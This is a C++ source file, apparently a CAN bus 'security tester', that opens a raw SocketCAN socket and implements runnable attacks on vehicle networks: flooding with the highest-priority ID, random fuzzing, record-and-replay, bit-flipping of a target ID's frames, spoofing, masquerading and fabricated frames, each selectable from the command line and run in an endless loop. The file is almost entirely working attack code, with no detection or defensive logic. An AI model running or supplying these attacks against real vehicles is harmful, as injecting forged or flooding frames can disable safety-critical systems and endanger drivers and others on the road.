#include <iostream>
#include <chrono>
#include <thread>
#include <vector>
#include <random>
#include <map>
#include <functional>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <unistd.h>
#include <algorithm>
#include <mutex>
#include <condition_variable>

struct CANFrame {
    canid_t id;
    uint8_t dlc;
    uint8_t data[8];
    std::chrono::microseconds timestamp;
};

class CANSecurityTester {
private:
    int socket_fd;
    struct sockaddr_can addr;
    struct ifreq ifr;
    std::mutex mtx;
    std::condition_variable cv;
    bool running = true;
    std::vector<CANFrame> recorded_frames;
    std::map<canid_t, CANFrame> last_seen_frames;

    bool initializeSocket(const std::string& ifname) {
        if ((socket_fd = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
            perror("Socket creation failed");
            return false;
        }

        strcpy(ifr.ifr_name, ifname.c_str());
        ioctl(socket_fd, SIOCGIFINDEX, &ifr);

        addr.can_family = AF_CAN;
        addr.can_ifindex = ifr.ifr_ifindex;

        if (bind(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            perror("Bind failed");
            return false;
        }

        return true;
    }

    bool sendFrame(const CANFrame& frame) {
        struct can_frame can_frame;
        can_frame.can_id = frame.id;
        can_frame.can_dlc = frame.dlc;
        memcpy(can_frame.data, frame.data, frame.dlc);
        
        return write(socket_fd, &can_frame, sizeof(struct can_frame)) == sizeof(struct can_frame);
    }

    CANFrame receiveFrame() {
        struct can_frame frame;
        CANFrame can_frame;
        
        if (read(socket_fd, &frame, sizeof(struct can_frame)) == sizeof(struct can_frame)) {
            can_frame.id = frame.can_id;
            can_frame.dlc = frame.can_dlc;
            memcpy(can_frame.data, frame.data, frame.can_dlc);
            can_frame.timestamp = std::chrono::duration_cast<std::chrono::microseconds>(
                std::chrono::system_clock::now().time_since_epoch());
        }
        
        return can_frame;
    }

public:
    CANSecurityTester(const std::string& interface = "can0") {
        if (!initializeSocket(interface)) {
            throw std::runtime_error("Failed to initialize CAN socket");
        }
    }

    ~CANSecurityTester() {
        close(socket_fd);
    }

    // 1. DOS Attack
    void dosAttack(int frequency_ms) {
        CANFrame frame;
        frame.id = 0x000;  // Highest priority
        frame.dlc = 8;
        memset(frame.data, 0x00, 8);

        std::cout << "Starting DOS attack with " << frequency_ms << "ms frequency\n";
        
        while(running) {
            sendFrame(frame);
            std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
        }
    }

    // 2. Fuzzing Attack
    void fuzzingAttack(int frequency_ms) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> id_dist(0, 0x7FF);
        std::uniform_int_distribution<> dlc_dist(0, 8);
        std::uniform_int_distribution<> data_dist(0, 255);

        std::cout << "Starting Fuzzing attack with " << frequency_ms << "ms frequency\n";

        while(running) {
            CANFrame frame;
            frame.id = id_dist(gen);
            frame.dlc = dlc_dist(gen);
            for(int i = 0; i < frame.dlc; i++) {
                frame.data[i] = data_dist(gen);
            }
            sendFrame(frame);
            std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
        }
    }

    // 3. Record Traffic for Replay Attacks
    void recordTraffic(int duration_seconds) {
        recorded_frames.clear();
        auto start_time = std::chrono::steady_clock::now();
        
        while(std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - start_time).count() < duration_seconds) {
            CANFrame frame = receiveFrame();
            recorded_frames.push_back(frame);
            last_seen_frames[frame.id] = frame;
        }
    }

    // 3.1 Basic Replay Attack
    void replayAttack(int frequency_ms) {
        std::cout << "Starting Replay attack with " << frequency_ms << "ms frequency\n";
        
        while(running && !recorded_frames.empty()) {
            for(const auto& frame : recorded_frames) {
                sendFrame(frame);
                std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
            }
        }
    }

    // 3.2 Situational Replay Attack
    void situationalReplayAttack(int frequency_ms, std::function<bool(const CANFrame&)> condition) {
        std::cout << "Starting Situational Replay attack\n";
        
        while(running && !recorded_frames.empty()) {
            for(const auto& frame : recorded_frames) {
                if(condition(frame)) {
                    sendFrame(frame);
                    std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
                }
            }
        }
    }

    // 4. Malfunction Attack
    void malfunctionAttack(canid_t target_id, std::function<void(uint8_t*)> data_modifier, int frequency_ms) {
        std::cout << "Starting Malfunction attack on ID: 0x" << std::hex << target_id << "\n";
        
        while(running) {
            if(last_seen_frames.count(target_id)) {
                CANFrame frame = last_seen_frames[target_id];
                data_modifier(frame.data);
                sendFrame(frame);
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
        }
    }

    // 5. Spoofing Attack
    void spoofingAttack(canid_t target_id, const uint8_t* data, uint8_t dlc, int frequency_ms) {
        CANFrame frame;
        frame.id = target_id;
        frame.dlc = dlc;
        memcpy(frame.data, data, dlc);

        std::cout << "Starting Spoofing attack for ID: 0x" << std::hex << target_id << "\n";
        
        while(running) {
            sendFrame(frame);
            std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
        }
    }

    // 6. Masquerade Attack
    void masqueradeAttack(canid_t original_id, canid_t masquerade_id, int frequency_ms) {
        std::cout << "Starting Masquerade attack\n";
        
        while(running) {
            if(last_seen_frames.count(original_id)) {
                CANFrame frame = last_seen_frames[original_id];
                frame.id = masquerade_id;
                sendFrame(frame);
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
        }
    }

    // 7. Fabrication Attack
    void fabricationAttack(const std::vector<CANFrame>& fabricated_frames, int frequency_ms) {
        std::cout << "Starting Fabrication attack\n";
        
        while(running) {
            for(const auto& frame : fabricated_frames) {
                sendFrame(frame);
                std::this_thread::sleep_for(std::chrono::milliseconds(frequency_ms));
            }
        }
    }

    // Utility: Stop all attacks
    void stop() {
        running = false;
        cv.notify_all();
    }
};

int main(int argc, char** argv) {
    if(argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <attack_type> <frequency_ms> [additional_params...]\n";
        std::cerr << "Attack types: dos, fuzz, replay, situational_replay, malfunction, spoofing, masquerade, fabrication\n";
        return 1;
    }

    try {
        CANSecurityTester tester("can0");
        std::string attack_type = argv[1];
        int frequency_ms = std::stoi(argv[2]);

        if(attack_type == "dos") {
            tester.dosAttack(frequency_ms);
        }
        else if(attack_type == "fuzz") {
            tester.fuzzingAttack(frequency_ms);
        }
        else if(attack_type == "replay") {
            tester.recordTraffic(10); // Record 10 seconds
            tester.replayAttack(frequency_ms);
        }
        else if(attack_type == "situational_replay") {
            tester.recordTraffic(10);
            // Example: Only replay frames with ID 0x100
            tester.situationalReplayAttack(frequency_ms, [](const CANFrame& frame) {
                return frame.id == 0x100;
            });
        }
        else if(attack_type == "malfunction") {
            // Example: Flip all bits in the data
            tester.malfunctionAttack(0x100, [](uint8_t* data) {
                for(int i = 0; i < 8; i++) data[i] = ~data[i];
            }, frequency_ms);
        }
        else if(attack_type == "spoofing") {
            uint8_t fake_data[8] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
            tester.spoofingAttack(0x100, fake_data, 8, frequency_ms);
        }
        else if(attack_type == "masquerade") {
            tester.masqueradeAttack(0x100, 0x200, frequency_ms);
        }
        else if(attack_type == "fabrication") {
            std::vector<CANFrame> fabricated_frames;
            // Add fabricated frames here
            tester.fabricationAttack(fabricated_frames, frequency_ms);
        }
        else {
            std::cerr << "Unknown attack type: " << attack_type << "\n";
            return 1;
        }
    }
    catch(const std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }

    return 0;
}